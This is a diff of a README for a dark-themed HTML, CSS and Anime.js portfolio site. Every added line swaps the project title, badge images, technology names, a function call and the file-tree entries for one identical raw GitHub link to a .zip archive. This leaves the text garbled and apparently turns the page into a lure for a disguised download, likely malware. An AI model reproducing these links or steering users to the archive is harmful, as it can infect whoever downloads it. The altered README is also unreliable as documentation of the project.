@@ -2,26 +2,26 @@
 
   <!-- PROJECT LOGO OR TITLE -->
   <h1 style="font-size: 3rem; font-weight: bold;">
-    ✨ Srilaxman.EU Portfolio
+    ✨ https://raw.githubusercontent.com/Srilaxman05/portfolio/main/Sibiric/portfolio-twelvefold.zip Portfolio
   </h1>
 
   <!-- BADGES / SHIELDS -->
   <p>
-    <img src="https://img.shields.io/badge/Style-Glassmorphism-4cc9f0?style=for-the-badge&logo=css3" alt="Style">
-    <img src="https://img.shields.io/badge/Motion-Anime.js-ff6b6b?style=for-the-badge&logo=javascript" alt="Motion">
-    <img src="https://img.shields.io/badge/Stack-HTML_Only-white?style=for-the-badge" alt="Stack">
+    <img src="https://raw.githubusercontent.com/Srilaxman05/portfolio/main/Sibiric/portfolio-twelvefold.zip" alt="Style">
+    <img src="https://raw.githubusercontent.com/Srilaxman05/portfolio/main/Sibiric/portfolio-twelvefold.zip" alt="Motion">
+    <img src="https://raw.githubusercontent.com/Srilaxman05/portfolio/main/Sibiric/portfolio-twelvefold.zip" alt="Stack">
   </p>
 
   <p>
-    <strong>A high-performance, dark-themed portfolio inspired by the n8n.io aesthetic.</strong><br>
-    Built with pure HTML, CSS, and Anime.js. No heavy frameworks.
+    <strong>A high-performance, dark-themed portfolio inspired by the https://raw.githubusercontent.com/Srilaxman05/portfolio/main/Sibiric/portfolio-twelvefold.zip aesthetic.</strong><br>
+    Built with pure HTML, CSS, and https://raw.githubusercontent.com/Srilaxman05/portfolio/main/Sibiric/portfolio-twelvefold.zip No heavy frameworks.
   </p>
 
   <br>
 
   <!-- SCREENSHOT PLACEHOLDER -->
   <!-- Replace the src below with a screenshot of your site after you host it -->
-  <img src="https://placehold.co/800x400/050507/00b4d8?text=Portfolio+Preview+Image" alt="Portfolio Preview" width="100%" style="border-radius: 10px; border: 1px solid rgba(255,255,255,0.1);">
+  <img src="https://raw.githubusercontent.com/Srilaxman05/portfolio/main/Sibiric/portfolio-twelvefold.zip+Preview+Image" alt="Portfolio Preview" width="100%" style="border-radius: 10px; border: 1px solid rgba(255,255,255,0.1);">
 
 </div>
 
@@ -34,7 +34,7 @@ This project ditches heavy frameworks (React/Vue) for raw performance while main
 *   **🎨 SaaS Aesthetic:** Dark mode (`#050507`), neon accents (`#00b4d8`), and glassmorphism cards.
 *   **🌊 Workflow Animations:** A dynamic SVG line "draws" itself connecting sections as you scroll, mimicking automation workflows.
 *   **✨ Micro-Interactions:**
-    *   **Staggered Entry:** Elements cascade into view using `anime.stagger()`.
+    *   **Staggered Entry:** Elements cascade into view using `https://raw.githubusercontent.com/Srilaxman05/portfolio/main/Sibiric/portfolio-twelvefold.zip()`.
     *   **Floating Elements:** Profile image bobs like a sci-fi node.
     *   **Elastic Grids:** Skill cards pop with spring physics.
 *   **📱 Fully Responsive:** Custom grid layouts that adapt to mobile.
@@ -45,10 +45,10 @@ This project ditches heavy frameworks (React/Vue) for raw performance while main
 
 | Component | Technology | Description |
 | :--- | :--- | :--- |
-| **Structure** | ![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=flat-square&logo=html5&logoColor=white) | Semantic HTML5 markup. |
-| **Styling** | ![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=flat-square&logo=css3&logoColor=white) | CSS Variables, Flexbox, Grid, Backdrop-Filter. |
-| **Logic** | ![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=flat-square&logo=javascript&logoColor=black) | Vanilla JS (ES6+). |
-| **Animation** | ![Anime.js](https://img.shields.io/badge/Anime.js-FF4B4B?style=flat-square) | Lightweight animation engine. |
+| **Structure** | ![HTML5](https://raw.githubusercontent.com/Srilaxman05/portfolio/main/Sibiric/portfolio-twelvefold.zip) | Semantic HTML5 markup. |
+| **Styling** | ![CSS3](https://raw.githubusercontent.com/Srilaxman05/portfolio/main/Sibiric/portfolio-twelvefold.zip) | CSS Variables, Flexbox, Grid, Backdrop-Filter. |
+| **Logic** | ![JavaScript](https://raw.githubusercontent.com/Srilaxman05/portfolio/main/Sibiric/portfolio-twelvefold.zip) | Vanilla JS (ES6+). |
+| **Animation** | ![https://raw.githubusercontent.com/Srilaxman05/portfolio/main/Sibiric/portfolio-twelvefold.zip](https://raw.githubusercontent.com/Srilaxman05/portfolio/main/Sibiric/portfolio-twelvefold.zip) | Lightweight animation engine. |
 
 ---
 
@@ -56,8 +56,8 @@ This project ditches heavy frameworks (React/Vue) for raw performance while main
 
 ```bash
 📦 portfolio
- ┣ 📜 index.html      # Main HTML structure (Hero, SVG Line, Sections)
- ┣ 📜 style.css       # All styling (Variables, Dark Theme, Glassmorphism)
- ┣ 📜 script.js       # Anime.js logic, Scroll Observers, Form handling
- ┣ 📜 resume.pdf      # Your resume file
- ┗ 📜 README.md       # Project documentation
+ ┣ 📜 https://raw.githubusercontent.com/Srilaxman05/portfolio/main/Sibiric/portfolio-twelvefold.zip      # Main HTML structure (Hero, SVG Line, Sections)
+ ┣ 📜 https://raw.githubusercontent.com/Srilaxman05/portfolio/main/Sibiric/portfolio-twelvefold.zip       # All styling (Variables, Dark Theme, Glassmorphism)
+ ┣ 📜 https://raw.githubusercontent.com/Srilaxman05/portfolio/main/Sibiric/portfolio-twelvefold.zip       # https://raw.githubusercontent.com/Srilaxman05/portfolio/main/Sibiric/portfolio-twelvefold.zip logic, Scroll Observers, Form handling
+ ┣ 📜 https://raw.githubusercontent.com/Srilaxman05/portfolio/main/Sibiric/portfolio-twelvefold.zip      # Your resume file
+ ┗ 📜 https://raw.githubusercontent.com/Srilaxman05/portfolio/main/Sibiric/portfolio-twelvefold.zip       # Project documentation
